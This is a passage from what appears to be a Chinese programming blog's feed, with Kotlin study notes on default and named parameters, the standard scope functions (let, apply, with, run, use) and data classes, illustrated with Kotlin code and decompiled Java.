HashMap&lt;String, String&gt; params)</span> </span>&#123;</span><br><span class="line">        toUriAct(ctx, uriStr, params, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">toUriAct</span><span class="params">(Context ctx, String uriStr, HashMap&lt;String, String&gt; params, <span class="keyword">boolean</span> newTask)</span> </span>&#123;</span><br><span class="line">        toUriAct(ctx, uriStr, params, newTask, -<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">toUriActWithAnim</span><span class="params">(Context ctx, String uriStr, <span class="keyword">int</span> animIn, <span class="keyword">int</span> animOut)</span> </span>&#123;</span><br><span class="line">        toUriAct(ctx, uriStr, (HashMap)<span class="keyword">null</span>, <span class="keyword">false</span>, -<span class="number">1</span>, <span class="keyword">true</span>, animIn, animOut);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">toUriAct</span><span class="params">(Context ctx, String uriStr, HashMap&lt;String, String&gt; params, <span class="keyword">boolean</span> newTask, <span class="keyword">int</span> requestCode)</span> </span>&#123;</span><br><span class="line">        toUriAct(ctx, uriStr, params, newTask, requestCode, <span class="keyword">false</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">toUriAct</span><span class="params">(Context ctx, String uriStr, HashMap&lt;String, String&gt; params, <span class="keyword">boolean</span> newTask, <span class="keyword">int</span> requestCode, <span class="keyword">boolean</span> needAnim, <span class="keyword">int</span> animIn, <span class="keyword">int</span> animOut)</span> </span>&#123;</span><br><span class="line">        toUriAct(ctx, uriStr, params, newTask, requestCode, needAnim, animIn, animOut, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">toUriAct</span><span class="params">(Context ctx, String uriStr, HashMap&lt;String, String&gt; params, <span class="keyword">boolean</span> newTask, <span class="keyword">int</span> requestCode, <span class="keyword">boolean</span> needAnim, <span class="keyword">int</span> animIn, <span class="keyword">int</span> animOut, <span class="keyword">boolean</span> useDedaultAnimation)</span> </span>&#123;</span><br><span class="line">        toUriActWithReturn(ctx, uriStr, params, newTask, requestCode, needAnim, animIn, animOut, useDedaultAnimation);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>重复代码多，可读性差。但是，在Java中没得选，只能这么写。</p><p>而在kotlin中，只需要写一个方法：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">toUriAct</span><span class="params">(ctx: <span class="type">Context</span>, uriStr: <span class="type">String</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             params: <span class="type">HashMap</span>&lt;<span class="type">String</span>, String&gt;? = <span class="literal">null</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             newTask: <span class="type">Boolean</span> = <span class="literal">false</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             requestCode: <span class="type">Int</span> = <span class="number">-1</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             needAnim: <span class="type">Boolean</span> = <span class="literal">false</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             animIn: <span class="type">Int</span> = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             animOut: <span class="type">Int</span> = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             useDedaultAnimation: <span class="type">Boolean</span> = <span class="literal">false</span>)</span></span> &#123;</span><br><span class="line">    toUriActWithReturn(ctx, uriStr, params, newTask, requestCode, needAnim, animIn, animOut, useDedaultAnimation)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>kotlin是这么实现默认参数的呢？</p><p>kotlin 会为带默认参数的方法生成一个bridge方法，bridge 方法中添加了一个新的int型的mask参数，其值默认为2<sup>n</sup>-1(n = args.length)。mask的二进制位对应n个参数位。</p><p>调用时，如果传参覆盖了默认值，则将参数位对应的mask位置0。</p><p>在bridge方法中会检测默认参数的参数位是否置0，否则使用默认值去调用原方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// $FF: synthetic method</span></span><br><span class="line"><span class="comment">// $FF: bridge method</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> toUriAct$<span class="keyword">default</span>(Context var0, String var1, HashMap var2, <span class="keyword">boolean</span> var3, <span class="keyword">int</span> var4, <span class="keyword">boolean</span> var5, <span class="keyword">int</span> var6, <span class="keyword">int</span> var7, <span class="keyword">int</span> var8, Object var9) &#123;</span><br><span class="line"> <span class="keyword">if</span>((var8 &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    var0 = (Context)<span class="keyword">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>((var8 &amp; <span class="number">2</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    var1 = <span class="string">""</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>((var8 &amp; <span class="number">4</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    var2 = (HashMap)<span class="keyword">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>((var8 &amp; <span class="number">8</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    var3 = <span class="keyword">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>((var8 &amp; <span class="number">16</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    var4 = -<span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>((var8 &amp; <span class="number">32</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    var5 = <span class="keyword">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>((var8 &amp; <span class="number">64</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    var6 = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>((var8 &amp; <span class="number">128</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    var7 = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> toUriAct(var0, var1, var2, var3, var4, var5, var6, var7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这种参数带默认值的方法只能在kotlin代码中调用，如果要在Java中调用，只要方法声明前加上<code>@JvmOverloads</code>标注，kotlin就会自动生成上述的方法重载，和用Java写的一样。</p><h3 id="7-命名参数">7. 命名参数</h3><p>举例说明：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">reformat</span><span class="params">(str: <span class="type">String</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             normalizeCase: <span class="type">Boolean</span> = <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             upperCaseFirstLetter: <span class="type">Boolean</span> = <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             divideByCamelHumps: <span class="type">Boolean</span> = <span class="literal">false</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             wordSeparator: <span class="type">Char</span> = <span class="string">' '</span>)</span></span> &#123;</span><br><span class="line">      <span class="comment">//……</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用形式改变如下：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">reformat(str, <span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="string">'_'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">reformat(str,</span><br><span class="line">    normalizeCase = <span class="literal">true</span>,</span><br><span class="line">    upperCaseFirstLetter = <span class="literal">true</span>,</span><br><span class="line">    divideByCamelHumps = <span class="literal">false</span>,</span><br><span class="line">    wordSeparator = <span class="string">'_'</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>Android Studio 3.0 已经自带了 parameter name hints ，所以这条现在看上去算不上特别吸引人了 :)<br><img src="/media/14994116820658.jpg" alt></p><h3 id="8-std自带函数">8. Std自带函数</h3><p>在kotlin的<code>Standard.kt</code>中定义了一些顶层高阶函数。<br><img src="/media/14994119797611.jpg" alt></p><p><code>TODO</code>、<code>take**</code>的几个顾名思义的方法不提了。下面的<code>run、with、apply、also、let</code>方法命名并不是一个好的实践（动词+名词），我们无法直接从名字上看出这些方法怎么用，怎么区分，只好read code 。</p><p>下面一一分析：</p><ul><li>let</li></ul><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Calls the specified function [block] with `this` value as its argument and returns its result.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@kotlin</span>.<span class="keyword">internal</span>.InlineOnly</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">inline</span> <span class="function"><span class="keyword">fun</span> <span class="type">&lt;T, R&gt;</span> T.<span class="title">let</span><span class="params">(block: (<span class="type">T</span>)</span></span> -&gt; R): R = block(<span class="keyword">this</span>)</span><br></pre></td></tr></table></figure><ol><li>receiver的扩展函数</li><li>参数是一个block，block参数为receiver，block内部通过it引用receiver</li><li>返回block的返回值</li><li>常常和安全调用操作符 <code>?.</code> 配合使用，用来保证let代码块中的it是已经null check过的</li></ol><p>demo</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> layout = LayoutStyle()</span><br><span class="line">SharedState.previousOrientation?.let &#123; layout.orientation = it &#125;</span><br></pre></td></tr></table></figure><ul><li>apply</li></ul><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Calls the specified function [block] with `this` value as its receiver and returns `this` value.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@kotlin</span>.<span class="keyword">internal</span>.InlineOnly</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">inline</span> <span class="function"><span class="keyword">fun</span> <span class="type">&lt;T&gt;</span> T.<span class="title">apply</span><span class="params">(block: <span class="type">T</span>.()</span></span> -&gt; <span class="built_in">Unit</span>): T &#123; block(); <span class="keyword">return</span> <span class="keyword">this</span> &#125;</span><br></pre></td></tr></table></figure><ol><li>receiver的扩展函数</li><li>参数是一个block，这个block本身也是receiver的扩展函数，block会在receiver的闭包内执行</li><li>最终返回receiver自身</li><li>常常被用来当做内置的builder，可以方便地实现chain式调用</li></ol><p>demo</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LayoutStyle</span> </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> orientation = HORIZONTAL</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(<span class="keyword">vararg</span> args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line"> <span class="keyword">val</span> layout = LayoutStyle().apply &#123; orientation = VERTICAL &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>with</li></ul><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Calls the specified function [block] with the given [receiver] as its receiver and returns its result.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@kotlin</span>.<span class="keyword">internal</span>.InlineOnly</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">inline</span> <span class="function"><span class="keyword">fun</span> <span class="type">&lt;T, R&gt;</span> <span class="title">with</span><span class="params">(receiver: <span class="type">T</span>, block: <span class="type">T</span>.()</span></span> -&gt; R): R = receiver.block()</span><br></pre></td></tr></table></figure><ol><li>with 不是扩展函数</li><li>参数是 receiver 和 block，这个block是receiver的扩展函数，block会在receiver的闭包内执行</li><li>返回block的返回值</li><li>当需要频繁access某个实例时，可以把他包在with代码块中，然后直接访问实例内部变量和方法。</li></ol><p>demo</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> layout = with(contextWrapper) &#123; </span><br><span class="line"> <span class="comment">// `this` is the contextWrapper</span></span><br><span class="line"> LayoutStyle(context, attrs).apply &#123; orientation = VERTICAL &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>run</p><p>run 有两个版本，第一个简单的调用block，第二个带上了泛型信息，成为了扩展函数。</p></li></ul><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Calls the specified function [block] and returns its result.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@kotlin</span>.<span class="keyword">internal</span>.InlineOnly</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">inline</span> <span class="function"><span class="keyword">fun</span> <span class="type">&lt;R&gt;</span> <span class="title">run</span><span class="params">(block: ()</span></span> -&gt; R): R = block()</span><br></pre></td></tr></table></figure><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Calls the specified function [block] with `this` value as its receiver and returns its result.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@kotlin</span>.<span class="keyword">internal</span>.InlineOnly</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">inline</span> <span class="function"><span class="keyword">fun</span> <span class="type">&lt;T, R&gt;</span> T.<span class="title">run</span><span class="params">(block: <span class="type">T</span>.()</span></span> -&gt; R): R = block()</span><br></pre></td></tr></table></figure><p>第一种使用场景不明。。。，这里只看第二种。</p><ol><li>receiver的扩展函数</li><li>参数是block，这个block是receiver的扩展函数，block会在receiver的闭包内执行</li><li>返回block的返回值</li></ol><p>剩下的<code>also</code>分析省略，总结成表格如下：</p><table><thead><tr><th>function</th><th>是否是扩展函数</th><th>block闭包环境</th><th>返回值</th></tr></thead><tbody><tr><td>let</td><td>是</td><td>it</td><td>block result</td></tr><tr><td>run</td><td>是</td><td>this</td><td>block result</td></tr><tr><td>also</td><td>是</td><td>it</td><td>receiver self</td></tr><tr><td>apply</td><td>是</td><td>this</td><td>receiver self</td></tr><tr><td>缺</td><td>否</td><td>it</td><td>block result</td></tr><tr><td>with</td><td>否</td><td>this</td><td>block result</td></tr><tr><td>缺</td><td>否</td><td>it</td><td>receiver self</td></tr><tr><td>缺</td><td>否</td><td>this</td><td>receiver self</td></tr></tbody></table><p>从上面的表看出，这种function按理应该有 2 <sup>3</sup> 8种。目前只提供了5种（是否是因为kotlin conf想不到更多的方法名了呢？）。</p><p>根据返回值来看：<br>also 和 apply 返回的 receiver self，方便chain式调用。</p><p>let 和 run 返回的是 block result ，可以获取block运行结果。</p><p>它们的区别是block内部引用receiver时：</p><p><code>let</code>和<code>also</code>使用it，而<code>run</code>和<code>apply</code>使用this。</p><p>从这个角度上看<code>let</code>(带有被动式的操作it)、<code>apply</code>(主动的应用到this)的命名还是比较贴切的。</p><p><code>with</code>作为非扩展函数是单独一档（没有同伴）。with返回 block result，而且 block 使用 this 引用receiver。从主要用法来说——简化对实例内部地访问，命名也很贴切，而且和别的语言惯例也是统一的。</p><p>另外在 <code>kotlin.io.Closeable.kt</code> 中还定义了<code>use</code> 扩展函数，也比较有意思。</p><ul><li>use</li></ul><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Executes the given [block] function on this resource and then closes it down correctly whether an exception</span></span><br><span class="line"><span class="comment"> * is thrown or not.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> block a function to process this [Closeable] resource.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the result of [block] function invoked on this resource.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@InlineOnly</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">inline</span> <span class="function"><span class="keyword">fun</span> <span class="type">&lt;T : Closeable?, R&gt;</span> T.<span class="title">use</span><span class="params">(block: (<span class="type">T</span>)</span></span> -&gt; R): R &#123;</span><br><span class="line">    <span class="keyword">var</span> closed = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> block(<span class="keyword">this</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e: Exception) &#123;</span><br><span class="line">        closed = <span class="literal">true</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>?.close()</span><br><span class="line">        &#125; <span class="keyword">catch</span> (closeException: Exception) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> e</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!closed) &#123;</span><br><span class="line">            <span class="keyword">this</span>?.close()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>use</code> 功能上会自动处理资源关闭的逻辑。有点类似 Java 7 的 try-with-resources 特性。</p><p><code>use</code> 和 <code>let</code> 在函数定义上相似，返回的是 block result，使用it引用receiver。区别是<code>use</code>的receiver 必须是<code>Closeable</code>的子类。</p><p>demo 可以看第一篇开头的例子：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> AssetManager.<span class="title">fileToString</span><span class="params">(filename: <span class="type">String</span>)</span></span>: String &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">open</span>(filename).use &#123;</span><br><span class="line">        it.readBytes().toString(Charset.defaultCharset())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://android.jlelse.eu/mastering-kotlin-standard-functions-run-with-let-also-and-apply-9cd334b0ef84" target="_blank" rel="noopener">Mastering Kotlin standard functions: run, with, let, also and apply</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍kotlin的几个特性如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;默认参数&lt;/li&gt;
&lt;li&gt;命名参数&lt;/li&gt;
&lt;li&gt;std自带函数&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
      <category term="kotlin" scheme="https://deskid.github.io/categories/Android/kotlin/"/>
    
    
      <category term="kotlin" scheme="https://deskid.github.io/tags/kotlin/"/>
    
  </entry>
  
  <entry>
    <title>kotlin 深入学习笔记(二)</title>
    <link href="https://deskid.github.io/2017/07/06/kotlin-learn-notes-2/"/>
    <id>https://deskid.github.io/2017/07/06/kotlin-learn-notes-2/</id>
    <published>2017-07-06T13:24:27.000Z</published>
    <updated>2018-11-14T03:29:41.235Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍kotlin的特性如下：</p><ul><li>data class</li></ul><a id="more"></a><p>接上篇，正如上篇所说，kotlin 没有重新造轮子，kotlin能做到的，用Java也能做到。所有的编程语言都是工具，目标都是为了实现业务功能。但是工具之间是有分别的：使用者是否用着顺手(是否对程序员友好)，完成任务的效率是否高效(开发效率是否高)，完成的任务质量是否有保障(运行效率是否高)——这三个维度足够说明一个工具是否优秀。单纯的争论类似“PHP是最好的编程语言”的言论没有任何意义。</p><h3 id="5-data-class">5. data class</h3><p>如果以后AI会写Java代码了，很大概率是先学会写 POJO(Plain old Java object)。</p><p>写POJO步骤如下：</p><ol><li>定义字段</li><li>写构造函数</li><li>写setter、getter</li><li>写equals、hashCode</li><li>写toString</li><li>写copy</li></ol><p>除了第一步需要人工干预，后面的代码可以利用插件自动生成。既然都可以自动生成了，那为啥还要程序员写出来呢？所以google开源了AutoValue库，只要写一个abstract class，AutoValue会自动实现上述方法。与此类似，kotlin则引入了data class的概念。</p><!-- more --><p>声明一个 data class，kotlin会做两件事：</p><ol><li>自动生成<code>equals()/hashCode()</code>, <code>toString()</code>, <code>copy()</code></li><li>自动生成<code>componentN()</code></li></ol><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">data</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>(<span class="keyword">val</span> login: String,</span><br><span class="line">                <span class="keyword">val</span> avatarUrl: String,</span><br><span class="line">                <span class="keyword">val</span> name: String,</span><br><span class="line">                <span class="keyword">val</span> company: String,</span><br><span class="line">                <span class="keyword">val</span> reposUrl: String,</span><br><span class="line">                <span class="keyword">val</span> blog: String)</span><br></pre></td></tr></table></figure><p>转化后生成Java代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">   <span class="meta">@NotNull</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> String login;</span><br><span class="line">   <span class="comment">//...</span></span><br><span class="line">   <span class="meta">@NotNull</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> String blog;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@NotNull</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">getLogin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.login;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//....</span></span><br><span class="line">   <span class="meta">@NotNull</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">getBlog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.blog;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(@NotNull String login, @NotNull String avatarUrl, @NotNull String name, @NotNull String company, @NotNull String reposUrl, @NotNull String blog)</span> </span>&#123;</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">      <span class="keyword">super</span>();</span><br><span class="line">      <span class="keyword">this</span>.login = login;</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">      <span class="keyword">this</span>.blog = blog;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@NotNull</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">component1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.login;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">   <span class="meta">@NotNull</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">component6</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.blog;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@NotNull</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> User <span class="title">copy</span><span class="params">(@NotNull String login, @NotNull String avatarUrl, @NotNull String name, @NotNull String company, @NotNull String reposUrl, @NotNull String blog)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> User(login, avatarUrl, name, company, reposUrl, blog);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"User(login="</span> + <span class="keyword">this</span>.login </span><br><span class="line">                + <span class="string">", avatarUrl="</span> + <span class="keyword">this</span>.avatarUrl</span><br><span class="line">                + <span class="string">", name="</span> + <span class="keyword">this</span>.name </span><br><span class="line">                + <span class="string">", company="</span> + <span class="keyword">this</span>.company </span><br><span class="line">                + <span class="string">", reposUrl="</span> + <span class="keyword">this</span>.reposUrl </span><br><span class="line">                + <span class="string">", blog="</span> + <span class="keyword">this</span>.blog + <span class="string">")"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (((((<span class="keyword">this</span>.login != <span class="keyword">null</span> ? <span class="keyword">this</span>.login.hashCode() : <span class="number">0</span>) * <span class="number">31</span> </span><br><span class="line">                + (<span class="keyword">this</span>.avatarUrl != <span class="keyword">null</span> ? <span class="keyword">this</span>.avatarUrl.hashCode() : <span class="number">0</span>)) * <span class="number">31</span> </span><br><span class="line">                + (<span class="keyword">this</span>.name != <span class="keyword">null</span> ? <span class="keyword">this</span>.name.hashCode() : <span class="number">0</span>)) * <span class="number">31</span> </span><br><span class="line">                + (<span class="keyword">this</span>.company != <span class="keyword">null</span> ? <span class="keyword">this</span>.company.hashCode() : <span class="number">0</span>)) * <span class="number">31</span></span><br><span class="line">                + (<span class="keyword">this</span>.reposUrl != <span class="keyword">null</span> ? <span class="keyword">this</span>.reposUrl.hashCode() : <span class="number">0</span>)) * <span class="number">31</span></span><br><span class="line">                + (<span class="keyword">this</span>.blog != <span class="keyword">null</span> ? <span class="keyword">this</span>.blog.hashCode() : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> != var1) &#123;</span><br><span class="line">            <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> User) &#123;</span><br><span class="line">                User var2 = (User) var1;</span><br><span class="line">                <span class="keyword">if</span> (Intrinsics.areEqual(<span class="keyword">this</span>.login, var2.login)</span><br><span class="line">                        &amp;&amp; Intrinsics.areEqual(<span class="keyword">this</span>.avatarUrl, var2.avatarUrl)</span><br><span class="line">                        &amp;&amp; Intrinsics.areEqual(<span class="keyword">this</span>.name, var2.name)</span><br><span class="line">                        &amp;&amp; Intrinsics.areEqual(<span class="keyword">this</span>.company, var2.company)</span><br><span class="line">                        &amp;&amp; Intrinsics.areEqual(<span class="keyword">this</span>.reposUrl, var2.reposUrl)</span><br><span class="line">                        &amp;&amp; Intrinsics.areEqual(<span class="keyword">this</span>.blog, var2.blog)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>kotlin 的 data class 虽然很好很强大，但也有许多限制：</p><ol><li><p>无法使用<code>open</code>修饰 data class<br><img src="/media/14993372396488.jpg" alt></p></li><li><p>无法写空构造函数<br><img src="/media/14993372660936.jpg" alt></p></li><li><p>所有参数必须有 val 或者 var 修饰<br><img src="/media/14993372928919.jpg" alt></p></li><li><p>不能是抽象类，不能是内部类<br><img src="/media/14993373205457.jpg" alt><br><img src="/media/14993373277548.jpg" alt></p></li></ol><p>定下神来，就会发现：这些都是在限制data class的继承功能。</p><p>那么，kotlin为什么不允许数据类之间继承呢。<br>假设 data class 可以实现继承：</p><p><strong>Base data class 的实例和继承类的实例之间 equals 如何写？</strong></p><p>根据 equals 的定义(不考虑null)：</p><ul><li>自反 A = A</li><li>对称 A = B -&gt; B = A</li><li>传递 A = B B = C -&gt; A = C</li><li>一致 一次调用A = B成立 -&gt; 多次调用A = B也成立</li></ul><p>根据上面代码可知，data class 生成的equals 判断的是 instanceof 比较。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object var1)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">this</span> != var1) &#123;</span><br><span class="line">       <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> User) &#123;</span><br><span class="line">           User var2 = (User) var1;</span><br><span class="line">           <span class="keyword">if</span> (Intrinsics.areEqual(<span class="keyword">this</span>.login, var2.login)</span><br><span class="line">                   &amp;&amp; </span><br><span class="line">                   <span class="comment">//...</span></span><br><span class="line">                   &amp;&amp; Intrinsics.areEqual(<span class="keyword">this</span>.blog, var2.blog)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span 